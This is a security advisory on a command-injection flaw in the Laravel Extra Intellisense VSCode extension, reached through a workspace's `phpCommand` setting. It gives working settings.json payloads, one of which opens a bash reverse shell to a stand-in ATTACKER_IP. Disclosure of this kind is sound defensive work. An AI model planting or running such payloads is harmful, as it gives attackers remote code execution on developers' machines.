## Vulnerability List

### 1. Command Injection in `phpCommand` Configuration

- **Description:**
    1. The extension allows users to configure the `LaravelExtraIntellisense.phpCommand` setting, which specifies the command used to execute PHP code.
    2. The extension uses `child_process.exec` to execute this command with PHP code generated by the extension.
    3. A malicious repository can provide a `.vscode/settings.json` file that modifies the `LaravelExtraIntellisense.phpCommand` to inject arbitrary shell commands.
    4. When the extension is activated in a workspace containing this malicious configuration, it will execute the injected shell commands alongside the intended PHP code.
    5. An attacker can achieve Remote Code Execution (RCE) by crafting a malicious `phpCommand` that executes arbitrary commands on the victim's machine when the extension attempts to gather Laravel project information.

- **Impact:**
    - Remote Code Execution (RCE). An attacker can execute arbitrary commands on the machine where the VSCode extension is running, potentially leading to full system compromise, data theft, or malware installation.

- **Vulnerability Rank:** critical

- **Currently Implemented Mitigations:**
    - None. The extension uses the configured `phpCommand` directly without any sanitization or validation. While the default `phpCommand` wraps `{code}` in double quotes, this is insufficient to prevent command injection when the entire command string is user-controlled via workspace settings.

- **Missing Mitigations:**
    - Input sanitization and validation for the `phpCommand` configuration setting.
    - Restricting the characters allowed in `phpCommand` to a safe subset.
    - Avoiding the use of `child_process.exec` for executing user-configured commands. Consider using safer alternatives like `child_process.spawn` with carefully constructed arguments, or disallowing user configuration of the entire command string and only allowing customization of specific parameters.
    - Display a warning message to the user when the extension detects a custom `phpCommand` configuration in the workspace, highlighting the security risks.

- **Preconditions:**
    - The victim must open a workspace in VSCode that contains a malicious `.vscode/settings.json` file.
    - The malicious `.vscode/settings.json` file must configure `LaravelExtraIntellisense.phpCommand` to inject shell commands.
    - The extension must be activated and attempt to execute a Laravel command (which happens automatically and periodically).

- **Source Code Analysis:**
    1. **File:** `src/helpers.ts`
    2. **Function:** `runPhp(code: string, description: string|null = null)`
    3. **Line:** `let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";` - Retrieves the `phpCommand` from user configuration.
    4. **Line:** `let command = commandTemplate.replace("{code}", code);` - Constructs the final command by replacing `{code}` placeholder.
    5. **Line:** `cp.exec(command, ...)` - Executes the command using `child_process.exec`.

    ```
    // Visualization of vulnerable code path in src/helpers.ts

    runPhp(code, description) {
      commandTemplate = getConfig('phpCommand') ?? "php -r \"{code}\"";  // Get phpCommand from config (user-controlled)
      command = commandTemplate.replace("{code}", code);               // Construct command string
      cp.exec(command, ...)                                          // Execute command string using shell (vulnerable)
    }
    ```

- **Security Test Case:**
    1. Create a new Laravel project or use an existing one.
    2. Create a `.vscode` directory at the root of the project.
    3. Inside `.vscode`, create a `settings.json` file with the following content:
    ```json
    {
        "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; touch /tmp/vscode-laravel-extra-intellisense-pwned\""
    }
    ```
    4. Open the Laravel project in VSCode with the Laravel Extra Intellisense extension activated.
    5. Wait for a short period (or trigger any extension feature that executes a Laravel command, e.g., opening a blade file to trigger view autocompletion).
    6. Check if the file `/tmp/vscode-laravel-extra-intellisense-pwned` exists. If it exists, the command injection is successful.
    7. To further verify, modify the `settings.json` to execute a more impactful command, like reverse shell or data exfiltration, and observe the results. For example:
    ```json
    {
        "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'\""
    }
    ```
    (Replace `ATTACKER_IP` with your attacker machine's IP and set up a netcat listener on port 9001).
